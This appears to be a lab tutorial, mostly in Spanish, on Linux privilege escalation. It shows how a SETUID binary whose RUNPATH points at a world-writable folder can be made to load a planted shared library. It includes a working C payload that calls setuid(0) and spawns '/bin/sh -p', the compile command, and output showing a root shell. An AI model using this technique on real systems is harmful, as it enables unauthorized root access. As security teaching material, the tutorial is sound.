Programs and binaries under development usually have custom libraries associated with them. Consider the following `SETUID` binary.

```r
htb-student@NIX02:~$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

Podemos usar [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) para imprimir el objeto compartido requerido por un binario u objeto compartido. `Ldd` muestra la ubicación del objeto y la dirección hexadecimal donde se carga en la memoria para cada una de las dependencias de un programa.

```r
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

Vemos una biblioteca no estándar llamada `libshared.so` listada como una dependencia para el binario. Como se mencionó anteriormente, es posible cargar bibliotecas compartidas desde ubicaciones personalizadas. Una de estas configuraciones es la configuración `RUNPATH`. Las bibliotecas en esta carpeta tienen preferencia sobre otras carpetas. Esto se puede inspeccionar usando la utilidad [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html).

```r
htb-student@NIX02:~$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

La configuración permite la carga de bibliotecas desde la carpeta `/development`, que es escribible por todos los usuarios. Esta mala configuración puede ser explotada colocando una biblioteca maliciosa en `/development`, la cual tendrá prioridad sobre otras carpetas porque las entradas en este archivo se verifican primero (antes que otras carpetas presentes en los archivos de configuración).

```r
htb-student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

Antes de compilar una biblioteca, necesitamos encontrar el nombre de la función llamada por el binario.

```r
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

```r
htb-student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```r
htb-student@NIX02:~$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

Podemos copiar una biblioteca existente a la carpeta `development`. Ejecutar `ldd` contra el binario lista la ruta de la biblioteca como `/development/libshared.so`, lo que significa que es vulnerable. Ejecutar el binario arroja un error que indica que no pudo encontrar la función llamada `dbquery`. Podemos compilar un objeto compartido que incluya esta función.

```r
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

```

La función `dbquery` establece nuestro user id a 0 (root) y ejecuta `/bin/sh` cuando se llama. Compílala usando [GCC](https://linux.die.net/man/1/gcc).

```r
htb-student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so
```

Ejecutar el binario nuevamente debería mostrar el banner y abrir una root shell.

```r
htb-student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```